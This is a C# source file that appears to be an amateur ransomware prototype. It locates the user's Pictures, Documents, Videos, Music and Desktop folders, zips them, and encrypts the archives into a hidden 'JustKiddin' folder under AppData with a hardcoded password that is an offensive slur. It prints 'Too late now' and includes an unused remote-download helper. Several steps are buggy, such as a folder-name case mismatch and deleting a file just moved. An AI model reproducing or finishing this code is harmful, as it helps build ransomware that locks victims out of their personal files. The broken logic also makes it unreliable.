using System;
using System.Net;
using System.Data;
using System.Text;
using System.IO;
using System.IO.Compression;
using Encryption;


EncryptDLL OpenCrypt = new();


var AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
var PictureData = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
var DocumentsData = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
var VideosData = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
var MusicData = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
var DeskData = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);



void DownloadFile(string url, string path)
{
    WebClient client = new();
    client.DownloadFile(url, path);
    Task.WaitAll();
}

void CreateAppData()
{
    if (Directory.Exists(AppData + "//Justkiddin"))
    {
    }
    else // NOT MADE
    {
        var MainDir = Directory.CreateDirectory(AppData + "//JustKiddin");
        Directory.CreateDirectory(MainDir + "//Pictures");
        Directory.CreateDirectory(MainDir + "//Downloads");
        Directory.CreateDirectory(MainDir + "//Desk");
        Directory.CreateDirectory(MainDir + "//Documents");
        Directory.CreateDirectory(MainDir + "//Videos");
        Directory.CreateDirectory(MainDir + "//Music");

    }
}




void DeleteData(string path, string name, string password) 
{
    Console.WriteLine("Zipping " + path);
    ZipFile.CreateFromDirectory(path, name + ".zip");
    Console.WriteLine("Zipped " + path);
    Console.WriteLine("Encrypting " + path);

    if(name == "PictureData")
    {
        OpenCrypt.FileEncrypt(name + ".zip", password);
        File.Move("Data.opencrypt", AppData + "//JustKiddin//Pictures//Data.opencrypt");
        Task.WaitAll();
        File.Delete("Data.opencrypt");
        File.Delete(name + ".zip");
        Console.WriteLine("Encrpyted " + path);

    }

    if (name == "DownloadsData")
    {
        OpenCrypt.FileEncrypt(name + ".zip", password);
        File.Move("Data.opencrypt", AppData + "//JustKiddin//Downloads//Data.opencrypt");
        Task.WaitAll();
        File.Delete("Data.opencrypt");
        File.Delete(name + ".zip");
        Console.WriteLine("Encrpyted " + path);
    }

    if (name == "DeskData")
    {
        OpenCrypt.FileEncrypt(name + ".zip", password);
        File.Move("Data.opencrypt", AppData + "//JustKiddin//Desk//Data.opencrypt");
        Task.WaitAll();
        File.Delete("Data.opencrypt");
        File.Delete(name + ".zip");
        Console.WriteLine("Encrpyted " + path);
    }

    if (name == "VideosData")
    {
        OpenCrypt.FileEncrypt(name + ".zip", password);
        File.Move("Data.opencrypt", AppData + "//JustKiddin//Videos//Data.opencrypt");
        Task.WaitAll();
        File.Delete("Data.opencrypt");
        File.Delete(name + ".zip");
        Console.WriteLine("Encrpyted " + path);
    }

    if (name == "MusicData")
    {
        OpenCrypt.FileEncrypt(name + ".zip", password);
        File.Move("Data.opencrypt", AppData + "//JustKiddin//Music//Data.opencrypt");
        Task.WaitAll();
        File.Delete("Data.opencrypt");
        File.Delete(name + ".zip");
        Console.WriteLine("Encrpyted " + path);
    }


    if (name == "DocumentData")
    {
        OpenCrypt.FileEncrypt(name + ".zip", password);
        File.Move("Data.opencrypt", AppData + "//JustKiddin//Documents//Data.opencrypt");
        Task.WaitAll();
        File.Delete("Data.opencrypt");
        File.Delete(name + ".zip");
        Console.WriteLine("Encrpyted " + path);
    }
    Task.WaitAll();

}




Console.WriteLine("Too late now");
CreateAppData();
DeleteData(PictureData, "PictureData", "Kanker123");
Task.WaitAll();
DeleteData(VideosData, "VideosData", "Kanker123");